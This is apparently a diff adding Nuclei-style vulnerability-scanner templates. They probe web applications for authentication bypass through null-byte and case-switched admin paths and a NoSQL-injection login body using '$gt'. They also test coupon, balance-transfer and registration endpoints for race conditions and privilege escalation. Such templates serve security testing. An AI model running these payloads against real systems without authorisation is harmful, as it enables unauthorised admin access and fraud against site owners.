@@ -1,0 +1,136 @@
+id: auth-bypass-null-byte
+info:
+  name: Authentication Bypass via Null Byte Injection
+  author: AniipID
+  severity: high
+  description: Tests for null byte injection to bypass authentication checks
+  tags: auth-bypass,nullbyte,injection
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin%00"
+      - "{{BaseURL}}/admin%00.htm"
+      - "{{BaseURL}}/admin%00.html"
+      - "{{BaseURL}}/admin%00.php"
+    matchers:
+      - type: word
+        words:
+          - "dashboard"
+          - "admin"
+          - "welcome"
+        condition: or
+        part: body
+
+---
+id: auth-bypass-case-switch
+info:
+  name: Case-Insensitive Auth Bypass Detection
+  author: AniipID
+  severity: medium
+  description: Tests for auth bypass using case manipulation in URLs
+  tags: auth-bypass,case,bypass
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ADMIN"
+      - "{{BaseURL}}/Admin"
+      - "{{BaseURL}}/aDmIn"
+      - "{{BaseURL}}/adMIN"
+    matchers:
+      - type: word
+        words:
+          - "dashboard"
+          - "admin"
+          - "users"
+          - "config"
+          - "password"
+        condition: or
+        part: body
+
+---
+id: auth-bypass-json-payload
+info:
+  name: Auth Bypass via JSON Content-Type Manipulation
+  author: AniipID
+  severity: high
+  description: Tests for auth bypass by switching content types (JSON/XML/Form)
+  tags: auth-bypass,json,xml,content-type
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/login"
+      - "{{BaseURL}}/api/auth"
+    headers:
+      Content-Type: application/json
+    body: '{"username": "admin", "password": {"$gt": ""}, "admin": true}'
+    matchers:
+      - type: word
+        words:
+          - "token"
+          - "authenticated"
+          - "session"
+          - "success"
+          - "welcome"
+        condition: or
+        part: body
+
+---
+id: race-condition-purchase
+info:
+  name: Race Condition in Purchase/Coupon API
+  author: AniipID
+  severity: high
+  description: Tests for race conditions in purchase, coupon, or balance endpoints
+  tags: race-condition,api,concurrency
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/coupon/redeem"
+      - "{{BaseURL}}/api/v1/coupon/apply"
+      - "{{BaseURL}}/api/balance/transfer"
+      - "{{BaseURL}}/api/order/confirm"
+    headers:
+      Content-Type: application/json
+    body: '{"code": "TEST123", "user": "admin"}'
+    matchers:
+      - type: word
+        words:
+          - "redeemed"
+          - "applied"
+          - "success"
+          - "confirmed"
+          - "balance"
+        condition: or
+        part: body
+
+---
+id: race-condition-signup
+info:
+  name: Race Condition in User Registration
+  author: AniipID
+  severity: medium
+  description: Tests for race conditions allowing duplicate registration or privilege escalation
+  tags: race-condition,registration,auth
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/register"
+      - "{{BaseURL}}/api/signup"
+      - "{{BaseURL}}/api/v1/users"
+    headers:
+      Content-Type: application/json
+    body: '{"username": "race_test", "email": "race@test.com", "password": "Test123!", "role": "admin"}'
+    matchers:
+      - type: word
+        words:
+          - "created"
+          - "registered"
+          - "success"
+          - "token"
+        condition: or
+        part: body
